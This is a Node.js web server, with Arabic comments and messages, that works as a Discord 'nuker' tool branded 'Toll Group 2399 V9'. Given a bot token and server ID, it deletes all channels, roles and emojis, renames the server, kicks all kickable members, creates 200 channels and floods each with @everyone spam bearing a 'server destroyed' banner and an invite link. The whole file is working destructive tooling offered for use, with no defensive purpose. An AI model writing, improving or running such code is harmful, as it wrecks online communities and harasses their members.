const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits } = require('discord.js');
const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/execute', async (req, res) => {
    const { token, guildId, action, customName, customMsg } = req.body;
    const client = new Client({ intents: [3276799] });

    try {
        await client.login(token);
        const guild = await client.guilds.fetch(guildId).catch(() => null);
        if (!guild) return res.status(404).send({ status: '❌ السيرفر مفقود أو البوت مطرود!' });

        res.status(200).send({ status: '🚀 V9 PRO: تم اختراق النظام وبدء التدمير الشامل!' });

        const name = customName || "Toll Group 2399 V9";
        const msg = customMsg || "# SERVER DESTROYED BY TOLL GROUP 2399 V9 PRO\nhttps://discord.gg/2399k";

        // --- نظام التدمير الذكي V9 ---
        if (action === 'تدمير') {
            // 1. حذف الرومات والرتب والإيموجي فوراً
            guild.channels.cache.forEach(c => c.delete().catch(() => {}));
            guild.roles.cache.forEach(r => r.delete().catch(() => {}));
            guild.emojis.cache.forEach(e => e.delete().catch(() => {}));

            // 2. تغيير اسم السيرفر وصورته (إذلال السيرفر)
            guild.setName(name).catch(() => {});

            // 3. طرد الجميع (نظام الطلقات المتعددة)
            const members = await guild.members.fetch();
            members.forEach(m => { if(m.kickable) m.kick('V9 Power').catch(() => {}); });

            // 4. فيضان الرومات (200 روم بسرعة البرق)
            for (let i = 0; i < 200; i++) {
                setTimeout(() => {
                    guild.channels.create({ 
                        name: name, 
                        type: ChannelType.GuildText 
                    }).then(ch => {
                        // سبام مكثف (150 رسالة مع منشن @everyone)
                        for(let j=0; j<150; j++) {
                            ch.send(`${msg} @everyone`).catch(() => {});
                        }
                    }).catch(() => {});
                }, i * 10); // تأخير 10 ملي ثانية فقط!
            }
        }

        if (action === 'طرد') {
            const members = await guild.members.fetch();
            members.forEach(m => { if(m.kickable) m.kick('V9 Force').catch(() => {}); });
        }

        if (action === 'سبام') {
            guild.channels.cache.forEach(ch => {
                if(ch.type === ChannelType.GuildText) {
                    for(let i=0; i<200; i++) setTimeout(() => ch.send(`${msg} \n**TOLL GROUP 2399**`).catch(() => {}), i * 100);
                }
            });
        }
    } catch (err) {
        console.log("V9 Error:", err.message);
        if (!res.headersSent) res.status(500).send({ status: '❌ فشل: تأكد من التوكن والـ Intents' });
    }
});

app.listen(process.env.PORT || 3000, '0.0.0.0');
